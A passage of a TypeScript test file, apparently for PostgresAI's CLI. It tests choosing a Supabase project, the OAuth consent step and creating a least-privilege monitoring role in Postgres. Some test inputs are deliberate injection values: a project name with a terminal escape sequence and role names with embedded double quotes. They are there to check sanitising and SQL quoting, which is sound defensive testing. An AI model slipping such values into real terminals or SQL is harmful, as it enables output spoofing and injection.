    expect(await connect(SB, { monitoringUser: " postgres_ai_mon ", waitMs: 0 }, deps)).toMatchObject({ status: "in_progress", id: "i-1" });
    expect(calls).toContain(`connect ${JSON.stringify({ project_ref: REF })}`);
  });
});

describe("mon deploy --provider supabase without a URL: pick the project (postgresai#438)", () => {
  const A = "aaaaaaaaaaaaaaaaaaaa";
  const B = "bbbbbbbbbbbbbbbbbbbb";
  const C = "cccccccccccccccccccc";
  const D = "dddddddddddddddddddd";
  const A_NAME = `db.${A}.supabase.co/postgres`;
  const AUTH = "https://api.supabase.com/v1/oauth/authorize?client_id=c&state=s";
  const proj = (ref: string, name: string, status: string, extra: Partial<SupabaseProject> = {}): SupabaseProject => ({
    ref, name, region: "us-east-1", status, postgres_version: "17.6",
    selectable: status === "active", reason: status === "active" ? null : status === "inactive" ? "paused" : `not_ready:${status}`,
    monitored: null, ...extra,
  });
  const PROJECTS = [
    proj(C, "analytics", "unhealthy"),
    proj(B, "old demo", "inactive"),
    proj(A, "shop prod", "active"),
  ];
  const LIST = { connected: true as const, supabase_org_name: "Acme", synced: true, projects: PROJECTS };
  const sbRow = (status: string | null, id = "i-1") => row(status, { id, name: A_NAME, provider: "supabase", cluster: `db.${A}.supabase.co:5432`, database: "postgres", host_metrics: false });
  const make = (over: Parameters<typeof fake>[0] & { lists?: SupabaseProjects[]; statuses?: { status: string; error?: string }[] } = {}) => {
    const lists = over.lists ?? [LIST];
    const statuses = over.statuses ?? [];
    let listed = 0;
    let polled = 0;
    const f = fake({ rows: [undefined, sbRow("launch_requested"), sbRow("active")], ...over });
    f.deps.quote = async () => { f.calls.push("quote"); return FREE_QUOTE; };
    f.deps.supabaseStart = async (u) => { f.calls.push(`start ${u}`); return { connected: true, project_ref: A }; };
    f.deps.supabaseProjects = over.supabaseProjects ?? (async () => { f.calls.push("projects"); return lists[Math.min(listed++, lists.length - 1)]!; });
    f.deps.supabaseStatus = over.supabaseStatus ?? (async (id) => { f.calls.push(`status ${id}`); return statuses[Math.min(polled++, statuses.length - 1)] as never; });
    f.deps.supabaseConnect = over.supabaseConnect ?? (async (body) => { f.calls.push(`connect ${JSON.stringify(body)}`); return { id: "i-1", name: A_NAME, status: "launch_requested" }; });
    f.deps.openUrl = (url) => { f.calls.push(`open ${url}`); };
    return f;
  };
  const shown = { supabase_org: "Acme", projects: PROJECTS };

  // S1: a person at a terminal picks from the list; the database is never logged in to.
  test("at a terminal: the list, the pick, the price, then the box", async () => {
    const f = make();
    f.deps.chooseSupabaseProject = async (projects, org) => { f.calls.push(`choose ${org} ${projects.map((p) => p.ref).join(",")}`); return A; };
    const result = await connect("", { provider: "supabase", waitMs: 0 }, f.deps);
    expect(result).toEqual({ status: "in_progress", provider: "supabase", name: A_NAME, id: "i-1", dashboard_url: null, host_metrics: false, ...FREE, next: "pgai mon instances watch i-1" });
    expect(f.calls).toEqual(["projects", `choose Acme ${C},${B},${A}`, "list", "quote", `connect ${JSON.stringify({ project_ref: A })}`]);
  });

  // S2: the org is not connected yet: consent in the browser, then the list.
  test("not connected: the consent page, then the list, then the pick", async () => {
    let t = 0;
    const f = make({ lists: [{ connected: false, auth_url: AUTH, session_id: "sess-1" }, LIST], statuses: [{ status: "pending" }, { status: "connected" }], now: () => t, sleep: async (ms) => { t += ms; } });
    f.deps.chooseSupabaseProject = async () => A;
    expect((await connect("", { provider: "supabase", waitMs: 60_000 }, f.deps)).status).toBe("ready");
    expect(f.calls.slice(0, 8)).toEqual(["projects", `open ${AUTH}`, "status sess-1", "status sess-1", "projects", "list", "quote", `connect ${JSON.stringify({ project_ref: A })}`]);
  });

  // S3: agents and scripts name the project: by ref, or by its exact name in any case.
  test("--supabase-project by ref or by name: no prompt, the same box", async () => {
    for (const wanted of [A, "Shop Prod"]) {
      const f = make();
      f.deps.chooseSupabaseProject = async () => { throw new Error("asked"); };
      const result = await connect("", { supabaseProject: wanted, waitMs: 0, yes: true }, f.deps);
      expect([result.status, result.name]).toEqual(["in_progress", A_NAME]);
      expect(f.calls).toEqual(["projects", "list", "quote", `connect ${JSON.stringify({ project_ref: A })}`]);
    }
  });

  // S4a: no terminal and no --supabase-project: the list to choose from, nothing created.
  test("an agent, or --json, without --supabase-project: the list (exit 3), nothing created", async () => {
    for (const opts of [{ agent: true }, { yes: true }, {}]) {
      const f = make();
      expect(await connect("", { provider: "supabase", waitMs: 0, ...opts }, f.deps)).toEqual({
        status: "action_required", provider: "supabase", name: "", ...shown,
        next: "Choose the Supabase project to monitor, then re-run with --supabase-project <name or project ID>",
      });
      expect(f.calls).toEqual(["projects"]);
    }
  });

  // S4b: an agent on an org not connected yet gets the consent link first.
  test("an agent, not connected: the consent link (exit 3); the re-run lists", async () => {
    const f = make({ lists: [{ connected: false, auth_url: AUTH, session_id: "sess-1" }] });
    expect(await connect("", { provider: "supabase", waitMs: 60_000, agent: true }, f.deps)).toEqual({
      status: "action_required", provider: "supabase", name: "",
      next: `Open ${AUTH} in a browser and approve PostgresAI's access to Supabase, then call deploy_monitoring again`,
    });
    expect(f.calls).toEqual(["projects"]);
  });

  // S5, S6, S9, S13: refused, and nothing created.
  test("unknown, paused, not ready, ambiguous, no active project, URL and project disagree: action required, nothing created", async () => {
    const cases: [Partial<Parameters<typeof connect>[1]> & { url?: string }, SupabaseProjects, string][] = [
      [{ supabaseProject: "nope" }, LIST, 'No Supabase project "nope" in organization "Acme": re-run with --supabase-project <name or project ID> of one of its projects'],
      [{ supabaseProject: B }, LIST, "old demo is paused: resume it in Supabase, then re-run"],
      [{ supabaseProject: "analytics" }, LIST, "analytics is not ready in Supabase (unhealthy): re-run when it is active"],
      [{ supabaseProject: "starting one" }, { ...LIST, projects: [proj(D, "starting one", "coming_up")] }, "starting one is not ready in Supabase (starting): re-run when it is active"],
      [{ supabaseProject: "twin" }, { ...LIST, projects: [proj(A, "twin", "active"), proj(D, "Twin", "active")] },
        'Several projects in organization "Acme" are called "twin": re-run with the project ID instead'],
      [{ provider: "supabase" }, { ...LIST, projects: [proj(B, "old demo", "inactive")] },
        'No active project in organization "Acme": resume one in Supabase, then re-run'],
      [{ provider: "supabase" }, { ...LIST, projects: [] }, 'There are no projects in the Supabase organization "Acme": create one there, then re-run'],
      [{ url: `postgresql://postgres:p@db.${C}.supabase.co:5432/postgres`, supabaseProject: A }, LIST,
        "--supabase-project is shop prod, but the database URL is for analytics: pass only one of them"],
    ];
    for (const [{ url, ...opts }, list, next] of cases) {
      const f = make({ lists: [list] });
      const result = await connect(url ?? "", { waitMs: 0, yes: true, ...opts }, f.deps);
      expect([result.status, result.next]).toEqual(["action_required", next]);
      expect(f.calls).toEqual(["projects"]);
    }
  });

  // The price prompt names the project: a name from Supabase reaches the terminal without its escapes.
  test("the price prompt shows the project name without terminal escapes", async () => {
    const asked: string[] = [];
    const f = make({ lists: [{ ...LIST, projects: [proj(A, "shop\x1b[2J prod", "active")] }] });
    f.deps.quote = async () => ({ ...FREE_QUOTE, billed: true });
    f.deps.confirm = async (q) => { asked.push(q); return false; };
    await connect("", { supabaseProject: A, waitMs: 0 }, f.deps);
    expect(asked).toEqual(["Provision shop prod (Supabase)? (y/N): "]);
  });

  // S7: a project that already has a box: that box, no second one, nothing billed.
  test("an already-monitored project: follows its box, no new box", async () => {
    const monitored = { ...LIST, projects: [proj(A, "shop prod", "active", { selectable: false, reason: "monitored", monitored: { id: "i-9", name: "shop prod (Supabase)", status: "active" } })] };
    const f = make({ lists: [monitored], rows: [sbRow("active", "i-9")] });
    const result = await connect("", { supabaseProject: A, waitMs: 0 }, f.deps);
    expect([result.status, result.id]).toEqual(["ready", "i-9"]);
    expect(f.calls).toEqual(["projects", "list"]);
  });

  // S10: an org member who is not an admin; an API from before postgresai#438.
  test("not an org admin, or an API without the list: action required", async () => {
    const member = make({ supabaseProjects: async () => { throw new HttpStatusError("cloud monitoring supabase projects: HTTP 403\nnot an admin", 403); } });
    expect((await connect("", { provider: "supabase", waitMs: 0 }, member.deps)).next).toBe(notAdminNextText);
    const old = make({ supabaseProjects: async () => { throw new HttpStatusError("cloud monitoring supabase projects: HTTP 404\nCould not find the function", 404); } });
    expect((await connect("", { provider: "supabase", waitMs: 0 }, old.deps)).next).toBe(
      "This PostgresAI API cannot list Supabase projects yet: pass the project's URL instead (pgai mon deploy 'postgresql://postgres@db.<project-ref>.supabase.co:5432/postgres')");
  });

  // S15: the consent ran out before it was approved.
  test("the consent expired: action required, re-run", async () => {
    let t = 0;
    const f = make({ lists: [{ connected: false, auth_url: AUTH, session_id: "sess-1" }], statuses: [{ status: "error", error: "The Supabase sign-in expired before it finished." }], now: () => t, sleep: async (ms) => { t += ms; } });
    expect((await connect("", { provider: "supabase", waitMs: 60_000 }, f.deps)).next).toBe(
      "Supabase did not connect: The Supabase sign-in expired before it finished. Re-run to try again");
  });

  test("--supabase-project with another provider, and Enter at the prompt: refused, nothing created", async () => {
    const f = make();
    expect((await connect("", { provider: "rds", supabaseProject: A, waitMs: 0 }, f.deps)).next).toBe("--supabase-project applies to Supabase only: leave it out, or use --provider supabase");
    f.deps.chooseSupabaseProject = async () => undefined;
    expect((await connect("", { provider: "supabase", waitMs: 0 }, f.deps)).next).toBe("No project chosen: re-run and pick one, or pass --supabase-project <name or project ID>");
    expect(f.calls).toEqual(["projects"]);
  });

  // REV round 1: a box on the project's database that the platform does not link to the project
  // (made through the generic path) is followed, not doubled by a second billed box.
  test("a box on the project's database, not linked to it: followed, no second box", async () => {
    const unlinked = row("active", { id: "i-7", name: "generic-box", provider: "self-managed", cluster: `db.${A}.supabase.co:5432`, database: "postgres" });
    for (const opts of [{ supabaseProject: A }, { supabaseProject: A, url: `postgresql://postgres:p@db.${A}.supabase.co:5432/postgres` }]) {
      const { url, ...rest } = opts as { supabaseProject: string; url?: string };
      const f = make({ rows: [unlinked] });
      const result = await connect(url ?? "", { waitMs: 0, yes: true, ...rest }, f.deps);
      expect([result.status, result.id]).toEqual(["ready", "i-7"]);
      expect(f.calls.some((c) => c.startsWith("connect "))).toBe(false);
    }
  });

  // REV round 1: --yes and agents never get a prompt.
  test("--yes or an agent without --supabase-project: the list, never the picker", async () => {
    for (const opts of [{ yes: true }, { agent: true }]) {
      const f = make();
      f.deps.chooseSupabaseProject = async () => { throw new Error("asked"); };
      expect((await connect("", { provider: "supabase", waitMs: 0, ...opts }, f.deps)).status).toBe("action_required");
    }
  });

  // REV round 1: Supabase did not answer the project list.
  test("the list could not be synced: empty → retry later; otherwise the list says it may be out of date", async () => {
    const empty = make({ lists: [{ ...LIST, synced: false, projects: [] }] });
    expect((await connect("", { provider: "supabase", waitMs: 0 }, empty.deps)).next).toBe(
      "Supabase did not answer the project list: re-run in a minute");
    const stale = make({ lists: [{ ...LIST, synced: false }] });
    expect((await connect("", { provider: "supabase", waitMs: 0 }, stale.deps)).next).toBe(
      "Choose the Supabase project to monitor, then re-run with --supabase-project <name or project ID> (Supabase did not answer just now: the list may be out of date)");
  });

  // Design review: nothing to pick at a terminal says why, before any prompt.
  test("every active project already monitored: why, no prompt, nothing created", async () => {
    const monitored = { ...LIST, projects: [proj(B, "old demo", "inactive"), proj(A, "shop prod", "active", { selectable: false, reason: "monitored", monitored: { id: "i-9", name: "shop", status: "active" } })] };
    const f = make({ lists: [monitored] });
    f.deps.chooseSupabaseProject = async () => { throw new Error("asked"); };
    expect((await connect("", { provider: "supabase", waitMs: 0 }, f.deps)).next).toBe(
      'Every active project in organization "Acme" is already monitored: see pgai mon instances list (a paused project can be monitored once it is resumed in Supabase)');
    expect(f.calls).toEqual(["projects"]);
  });

  // Design review: the step view names the project picked, not a host the user never typed.
  test("the price and provisioning events name the project picked", async () => {
    const events: ProgressEvent[] = [];
    const f = make({ progress: (e) => events.push(e) });
    await connect("", { supabaseProject: A, waitMs: 0 }, f.deps);
    expect(events.filter((e) => e.event !== "box").map((e) => [e.event, e.message, e.project])).toEqual([
      ["billing", "Estimated cost: free (1 of 1 free slots)", "shop prod (Supabase)"],
      ["provisioning", "Provisioning monitoring for shop prod (Supabase)", "shop prod (Supabase)"],
    ]);
  });

  // Design review: a person reads the list one project per line, aligned, statuses in words.
  test("a person reads the projects as aligned rows", () => {
    const projects = [...PROJECTS, proj(D, "new", "coming_up")];
    expect(supabaseProjectRows(projects)).toEqual([
      `  analytics  us-east-1  ${C}  not ready (unhealthy)`,
      `  old demo   us-east-1  ${B}  paused`,
      `  shop prod  us-east-1  ${A}`,
      `  new        us-east-1  ${D}  not ready (starting)`,
    ]);
    expect(supabaseProjectRows(projects, true)).toEqual([
      `   - analytics  us-east-1  ${C}  not ready (unhealthy)`,
      `   - old demo   us-east-1  ${B}  paused`,
      `  1. shop prod  us-east-1  ${A}`,
      `   - new        us-east-1  ${D}  not ready (starting)`,
    ]);
    expect(resultLines({ status: "action_required", provider: "supabase", name: "", supabase_org: "Acme", projects: PROJECTS, next: "Choose" })).toEqual([
      "Choose", `  analytics  us-east-1  ${C}  not ready (unhealthy)`, `  old demo   us-east-1  ${B}  paused`, `  shop prod  us-east-1  ${A}`,
    ]);
  });
});

describe("prepareDatabase (a fake pg client)", () => {
  const ADMIN = "postgresql://postgres:adminpw@db.example.com:5432/app?sslmode=require&options=-c%20role%3Dx&sslrootcert=%2Ftmp%2Fca.pem&application_name=pgai";
  const SET_PASSWORD = "Set PGAI_MON_PASSWORD to the password of postgres_ai_mon, or give it a new one: pgai mon deploy <admin-url> --reset-password (anything else that logs in as postgres_ai_mon then needs the new password)";
  const pgError = (code: string, message: string) => Object.assign(new Error(message), { code });

  /** `logins` answers each login as `role` in turn (an error to throw, or "ok"); the last one repeats. */
  function server(me: { name?: string; admin?: boolean; mon_exists: boolean; mon_privileged?: boolean; mon_groups?: string | null; mon_owns?: boolean; mon_grants?: string | null; fails?: RegExp; ssl?: "on" | "off" }, logins: (Error | "ok")[] = ["ok"], role = "postgres_ai_mon") {
    const ran: string[] = [];
    const sqls: string[] = [];
    const monLogins: string[] = [];
    const monUrls: string[] = [];
    const sessions: string[][] = [];
    class FakeClient {
      password: string;
      private user: string;
      private statements: string[] = [];
      constructor(private config: ClientConfig) {
        const u = config.connectionString ? new URL(config.connectionString) : undefined;
        for (const key of ["sslmode", "sslcert", "sslkey", "sslrootcert"]) u?.searchParams.delete(key);
        const client = new Client({ ...config, connectionString: u?.toString() });
        // Supabase's pooler (Supavisor) routes on the user's ".<project-ref>" and logs in without it.
        const pooled = !!u?.hostname.endsWith(".pooler.supabase.com");
        this.user = pooled ? (client.user ?? "").replace(/\.[^.]*$/, "") : client.user ?? "";
        this.password = client.password ?? "";
        if (this.user === role && config.connectionString) monUrls.push(config.connectionString);
      }
      async connect() {
        if (this.config.ssl && me.name === "no-tls") throw new Error("The server does not support SSL connections");
        if (this.user === role) {
          const answer = logins[Math.min(monLogins.length, logins.length - 1)];
          monLogins.push(this.password);
          if (answer !== "ok") throw answer;
        }
        sessions.push(this.statements);
      }
      async query(sql: string) {
        this.statements.push(sql);
        if (/session_user as name/.test(sql)) {
          // Only the columns the SQL selects, each from what it is: a column dropped from the query is missing here too.
          const row: Record<string, unknown> = { name: "postgres", db: "app", admin: true, iterations: "4096", mon_privileged: false, mon_groups: null, mon_owns: false, mon_grants: null, ...me };
          const selects: Record<string, RegExp> = {
            name: /session_user as name/, db: /current_database\(\) as db/, admin: /\) as admin\b/,
            mon_exists: new RegExp(`rolname = '${role}'\\) as mon_exists`), iterations: /current_setting\('scram_iterations', true\) as iterations/,
            ssl: /current_setting\('ssl'\) as ssl/,
            mon_privileged: new RegExp(`rolname = '${role.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}' and \\(rolsuper or rolcreatedb or rolcreaterole or rolreplication or rolbypassrls\\)\\) as mon_privileged`),
            mon_groups: /\) as mon_groups\b/, mon_owns: /\) as mon_owns\b/, mon_grants: /\) as mon_grants\b/,
          };
          return { rows: [Object.fromEntries(Object.entries(selects).filter(([, re]) => re.test(sql)).map(([k]) => [k, row[k]]))] };
        }
        if (this.user !== role && !/^set (statement_timeout|search_path) =/i.test(sql)) ran.push(sql.trim().split("\n")[0]);
        if (this.user !== role && !/session_user as name/.test(sql) && !/^set (statement_timeout|search_path) =/i.test(sql)) sqls.push(sql);
        if (me.fails?.test(sql)) throw pgError("42501", "permission denied");
        // The monitoring role's own session: every check of verifyInitSetup passes.
        if (me.name === role) return { rowCount: 1, rows: [{ ok: true, setting: "search_path=pg_catalog, postgres_ai, public, pg_temp" }] };
        return { rows: [] };
      }
      async end() {}
    }
    const prepare = (opts: PrepareOptions = {}, url = opts.agent ? "postgresql://postgres:adminpw@db.example.com:5432/app?sslmode=require&application_name=pgai" : ADMIN) => prepareDatabase(url, "self-managed", { ...opts, Client: FakeClient as unknown as PrepareOptions["Client"] });
    const unprepare = (o: PrepareOptions = {}) => unprepareDatabase(ADMIN, { ...o, Client: FakeClient as unknown as PrepareOptions["Client"] });
    return { prepare, unprepare, ran, sqls, monLogins, monUrls, sessions };
  }
  const withMonPassword = async <T>(value: string | undefined, fn: () => Promise<T>) => {
    if (value !== undefined) process.env.PGAI_MON_PASSWORD = value;
    try {
      return await fn();
    } finally {
      delete process.env.PGAI_MON_PASSWORD;
    }
  };

  test.each([false, true])("every session sets a safe search_path before probes, setup and drop (agent=%p)", async (agent) => {
    const s = server({ mon_exists: false });
    expect(await withMonPassword(undefined, () => s.prepare({ check: true, agent }))).toEqual({ checked: true });
    expect(await withMonPassword(undefined, () => s.prepare({ agent }))).toHaveProperty("monitoringUrl");
    expect(await s.unprepare()).toBe(true);
    expect(s.sessions.length).toBe(4);
    for (const statements of s.sessions) {
      expect(statements.filter((sql) => !/^set statement_timeout =/i.test(sql))[0]).toBe("set search_path = pg_catalog, pg_temp");
    }
    expect(s.sqls.join("\n")).toMatch(/create extension if not exists pg_stat_statements with schema public;/);
    expect(s.sqls.join("\n")).toMatch(/create extension if not exists rds_tools with schema rds_tools;/);
  });

  test("the stored-password plan, TLS fallback and failed-plan cleanup keep a safe search_path", async () => {
    const reused = server({ mon_exists: true });
    expect(await withMonPassword(undefined, () => reused.prepare({ storedPassword: true }))).toHaveProperty("storedPassword", true);
    const failed = server({ name: "no-tls", mon_exists: false, fails: /create extension/ });
    await expect(withMonPassword(undefined, () => failed.prepare({}, "postgresql://postgres:adminpw@db.example.com:5432/app"))).rejects.toThrow('Failed at step "02.extensions"');
    expect(failed.ran.at(-1)).toBe('drop role "postgres_ai_mon"');
    expect(reused.sessions.length).toBe(1);
    expect(failed.sessions.length).toBe(2);
    for (const statements of [...reused.sessions, ...failed.sessions]) {
      expect(statements.filter((sql) => !/^set statement_timeout =/i.test(sql))[0]).toBe("set search_path = pg_catalog, pg_temp");
    }
  });

  test("the TLS warning goes to opts.warn, not to stderr (mon deploy's step view)", async () => {
    const s = server({ mon_exists: false });
    const warned: string[] = [];
    const stderr = spyOn(console, "error").mockImplementation(() => {});
    try {
      await withMonPassword(undefined, () => s.prepare({ check: true, warn: (m: string) => warned.push(m) } as PrepareOptions, "postgresql://postgres:adminpw@db.example.com:5432/app"));
      expect(stderr).not.toHaveBeenCalled();
    } finally {
      stderr.mockRestore();
    }
    expect(warned).toHaveLength(1);
    expect(warned[0]).toMatch(/^Warning: the database server certificate is not verified/);
  });

  test("an existing role and a rejected PGAI_MON_PASSWORD: refused before anything runs", async () => {
    const s = server({ mon_exists: true }, [pgError("28P01", "password authentication failed")]);
    expect(await withMonPassword("not-the-password", () => s.prepare())).toEqual({
      next: `postgres_ai_mon already exists on this server and PGAI_MON_PASSWORD is not its password. ${SET_PASSWORD}`,
    });
    expect(s.monLogins).toEqual(["not-the-password"]);
    expect(s.ran).toEqual([]);
  });

  test("an existing role and --reset-password: a new password is set, and the box's URL carries it", async () => {
    const s = server({ mon_exists: true });
    const result = await withMonPassword(undefined, () => s.prepare({ resetPassword: true }));
    const password = new URL((result as { monitoringUrl: string }).monitoringUrl).password;
    expect(password.length).toBeGreaterThan(20);
    expect(result).toEqual({ monitoringUrl: `postgresql://postgres_ai_mon:${password}@db.example.com:5432/app?sslmode=require&application_name=pgai` });
    expect(s.sqls.some((q) => /alter user "?postgres_ai_mon"? with password 'SCRAM-SHA-256\$/.test(q))).toBe(true);
    // The new password logs in before the box gets it.
    expect(s.monLogins.at(-1)).toBe(password);
  });

  test("--monitoring-user, an existing role and --reset-password: that role gets the new PGAI_MON_PASSWORD, the box's URL carries it, and postgres_ai_mon is not touched", async () => {
    const s = server({ mon_exists: true }, ["ok"], "my_mon");
    const result = await withMonPassword("new-pw-1", () => s.prepare({ resetPassword: true, monitoringUser: "my_mon" }));
    const password = new URL((result as { monitoringUrl: string }).monitoringUrl).password;
    expect(password).toBe("new-pw-1");
    expect(result).toEqual({ monitoringUrl: `postgresql://my_mon:${password}@db.example.com:5432/app?sslmode=require&application_name=pgai` });
    expect(s.sqls.some((q) => /alter user "my_mon" with password 'SCRAM-SHA-256\$/.test(q))).toBe(true);
    expect(s.monLogins.at(-1)).toBe(password);
    expect(s.sessions.flat().join("\n")).not.toContain("postgres_ai_mon");
  });

  // PostgresAI keeps no password for a custom role: a generated one would be lost (the second database
  // of the server would then stop at "already exists" with no way out).
  const NEED_PW = "Set PGAI_MON_PASSWORD to a password for my_mon: PostgresAI keeps no password for a custom role, so a generated one would be lost";
  test.each([
    ["a new role", { mon_exists: false }, {}],
    ["--reset-password", { mon_exists: true }, { resetPassword: true }],
  ] as const)("--monitoring-user, %s, no PGAI_MON_PASSWORD: refused before anything runs", async (_what, me, o) => {
    const s = server(me, ["ok"], "my_mon");
    expect(await withMonPassword(undefined, () => s.prepare({ ...o, monitoringUser: "my_mon" }))).toEqual({ next: NEED_PW });
    expect(await withMonPassword(undefined, () => s.prepare({ ...o, monitoringUser: "my_mon", check: true }))).toEqual({ next: NEED_PW });
    expect(s.ran).toEqual([]);
  });

  test("--monitoring-user from an agent's admin URL, a new role: refused (an agent sets no password)", async () => {
    const s = server({ mon_exists: false }, ["ok"], "my_mon");
    expect(await s.prepare({ agent: true, monitoringUser: "my_mon" })).toEqual({
      next: "my_mon is a custom role, and PostgresAI keeps no password for it: pass its URL as database_url, or run pgai mon deploy in a terminal with PGAI_MON_PASSWORD set",
    });
    expect(s.ran).toEqual([]);
  });

  test("--monitoring-user, the role exists and no PGAI_MON_PASSWORD: the hint resets it with PGAI_MON_PASSWORD, and there is no reset prompt", async () => {
    const s = server({ mon_exists: true }, ["ok"], "my_mon");
    expect(await withMonPassword(undefined, () => s.prepare({ monitoringUser: "my_mon" }))).toEqual({
      next: "my_mon already exists on this server. Set PGAI_MON_PASSWORD to the password of my_mon, or give it a new one: PGAI_MON_PASSWORD=<new password> pgai mon deploy <admin-url> --monitoring-user my_mon --reset-password (anything else that logs in as my_mon then needs the new password)",
    });
    expect(s.ran).toEqual([]);
  });

  test.each([
    ["an admin URL", { mon_exists: true, mon_privileged: true }, undefined],
    ["the role's own URL", { name: "my_mon", mon_exists: true, mon_privileged: true }, "postgresql://my_mon:monpw@db.example.com:5432/app?sslmode=require"],
  ] as const)("--monitoring-user naming a privileged role (%s): refused before anything runs", async (_what, me, url) => {
    const s = server(me, ["ok"], "my_mon");
    expect(await withMonPassword("pw-1", () => s.prepare({ monitoringUser: "my_mon" }, url))).toEqual({
      next: "my_mon is a superuser, or has CREATEDB, CREATEROLE, REPLICATION or BYPASSRLS: a monitoring role must not. Use another --monitoring-user",
    });
    expect(s.ran).toEqual([]);
  });

  // A role this run did not create may already do more than monitor: --reset-password would hand its
  // credentials to the box, and the plan would change its search_path.
  test.each([
    ["a member of another role, --reset-password", { mon_exists: true, mon_groups: "app_rw, postgres" }, { resetPassword: true }, undefined,
      "my_mon is a member of app_rw, postgres: a monitoring role may be a member of pg_monitor, pg_read_all_stats, pg_read_all_settings and pg_stat_scan_tables only. Use another --monitoring-user"],
    ["an owner of objects, its own URL", { name: "my_mon", mon_exists: true, mon_owns: true }, {}, "postgresql://my_mon:monpw@db.example.com:5432/app?sslmode=require",
      "my_mon owns objects on this server: a monitoring role must own nothing. Use another --monitoring-user"],
    ["a role with write grants, --reset-password", { mon_exists: true, mon_grants: "table t, database app" }, { resetPassword: true }, undefined,
      "my_mon has grants on table t, database app: a monitoring role may have only CONNECT, USAGE on schemas other than pg_toast, SELECT outside pg_catalog and pg_toast, and the grants pgai makes. Use another --monitoring-user"],
  ] as const)("--monitoring-user naming %s: refused before anything runs", async (_what, me, o, url, next) => {
    const s = server(me, ["ok"], "my_mon");
    expect(await withMonPassword("pw-1", () => s.prepare({ ...o, monitoringUser: "my_mon" }, url))).toEqual({ next });
    expect(s.ran).toEqual([]);
  });

  test("a role name with a double quote: quoted in the existence check, create, grants and search_path", async () => {
    const role = 'My"Mon';
    const s = server({ mon_exists: false }, ["ok"], role);
    expect(await withMonPassword("pw-1", () => s.prepare({ monitoringUser: role }))).toHaveProperty("monitoringUrl");
    const all = s.sessions.flat().join("\n");
    expect(all).toContain(`rolname = 'My"Mon') as mon_exists`);
    expect(all).toContain('create user "My""Mon" with password');
    expect(all).toContain('grant pg_monitor to "My""Mon"');
    expect(all).toContain('grant connect on database "app" to "My""Mon"');
    expect(all).toContain(`format('alter user %I set search_path = %s', 'My"Mon', role_path)`);
    expect(all).toContain(`format('alter user %I in database %I set search_path = %s', 'My"Mon', pg_catalog.current_database(), db_path)`);
  });

  test("--monitoring-user and a failed plan: the role keeps the user's PGAI_MON_PASSWORD and is not dropped (postgres_ai_mon neither)", async () => {
    const s = server({ name: "no-tls", mon_exists: false, fails: /create extension/ }, ["ok"], "my_mon");
    await expect(withMonPassword("pw-1", () => s.prepare({ monitoringUser: "my_mon" }, "postgresql://postgres:adminpw@db.example.com:5432/app"))).rejects.toThrow('Failed at step "02.extensions"');
    expect(s.ran.filter((q) => /^drop role/.test(q))).toEqual([]);
  });

  test("--reset-password is not for an agent's URL", async () => {
    const s = server({ mon_exists: true });
    expect((await s.prepare({ agent: true, resetPassword: true }) as { next: string }).next).toStartWith("postgres_ai_mon already exists on this server. Pass its URL as database_url");
    expect(s.sqls).toEqual([]);
  });

  test("--monitoring-user: the role is created and granted under that name, and the box's URL logs in as it", async () => {
    const s = server({ mon_exists: false }, ["ok"], "my_mon");
    const result = await withMonPassword("pw-1", () => s.prepare({ monitoringUser: "my_mon" }));
    expect(result).toEqual({ monitoringUrl: "postgresql://my_mon:pw-1@db.example.com:5432/app?sslmode=require&application_name=pgai" });
    expect(s.sqls.join("\n")).toContain('create user "my_mon" with password');
    expect(s.sessions.flat().join("\n")).not.toContain("postgres_ai_mon");
  });

  test("--monitoring-user with that role's own URL: checked as that role, and the box's URL keeps it", async () => {
    const s = server({ name: "my_mon", mon_exists: true }, ["ok", pgError("28P01", "password authentication failed")], "my_mon");
    const result = await s.prepare({ monitoringUser: "my_mon" }, "postgresql://my_mon:monpw@db.example.com:5432/app?sslmode=require");
    expect(result).toEqual({ monitoringUrl: "postgresql://my_mon:monpw@db.example.com:5432/app?sslmode=require" });
    expect(s.ran).toEqual([]);
  });

  test("a role name is quoted in the cleanup that drops it", async () => {
    const s = server({ mon_exists: false }, ["ok"], 'Mon"Q');
    expect(await s.unprepare({ monitoringUser: 'Mon"Q' })).toBe(true);
    expect(s.ran).toEqual(['drop role "Mon""Q"']);
  });

  // Supabase's pooler routes on the user's ".<project-ref>": the box's URL must keep it.
  const POOLER = "aws-0-us-east-1.pooler.supabase.com";
  test.each([
    ["an admin URL", { mon_exists: false }, ["ok"], "postgres.abcdefghij:adminpw", "pw-1"],
    ["the role's own URL", { name: "postgres_ai_mon", mon_exists: true }, ["ok", pgError("28P01", "password authentication failed")], "postgres_ai_mon.abcdefghij:pw-1", undefined],
  ] as const)("Supabase pooler, %s: the box's URL keeps the project suffix", async (_what, me, logins, userinfo, monPassword) => {
    const s = server(me, [...logins]);
    const result = await withMonPassword(monPassword, () => s.prepare({}, `postgresql://${userinfo}@${POOLER}:6543/postgres?sslmode=require`));
    expect(result).toEqual({ monitoringUrl: `postgresql://postgres_ai_mon.abcdefghij:pw-1@${POOLER}:6543/app?sslmode=require` });
    for (const u of s.monUrls) expect(new URL(u).username).toBe("postgres_ai_mon.abcdefghij");
  });

  test("Supabase pooler with --monitoring-user: the box logs in as <role>.<project-ref>", async () => {
    const s = server({ mon_exists: false }, ["ok"], "my_mon");
    const result = await withMonPassword("pw-1", () => s.prepare({ monitoringUser: "my_mon" }, `postgresql://postgres.abcdefghij:adminpw@${POOLER}:5432/postgres?sslmode=require`));
    expect(result).toEqual({ monitoringUrl: `postgresql://my_mon.abcdefghij:pw-1@${POOLER}:5432/app?sslmode=require` });
  });

  test("an existing role, no PGAI_MON_PASSWORD, and the platform keeps the server's password: the plan keeps the password, and the box's URL carries none", async () => {
    const s = server({ mon_exists: true });
    const result = await withMonPassword(undefined, () => s.prepare({ storedPassword: true }));
    expect(result).toEqual({ monitoringUrl: "postgresql://postgres_ai_mon@db.example.com:5432/app?sslmode=require&application_name=pgai", storedPassword: true });
    expect(s.sqls.some((q) => /alter user "?postgres_ai_mon"? with password/.test(q))).toBe(false);
    expect(s.ran.length).toBeGreaterThan(0);
    expect(s.monLogins).toEqual([]);
    // The check before the price changes nothing.
    const c = server({ mon_exists: true });
    expect(await withMonPassword(undefined, () => c.prepare({ storedPassword: true, check: true }))).toEqual({ checked: true });
    expect(c.ran).toEqual([]);
  });

  const TLS_ONLY = (needs: string, what = "The URL") => `postgres_ai_mon already exists on this server. ${what} needs ${needs}: the password PostgresAI keeps for this server is sent only over TLS, to a URL with each parameter once`;
  const SSLMODE = "sslmode=require (or verify-full)";

  test.each(["sslmode=require", "sslmode=verify-ca", "sslmode=verify-full", "application_name=pgai&sslmode=require&channel_binding=require", "sslmode=require&options=-c%20role%3Dx&options=x"])(
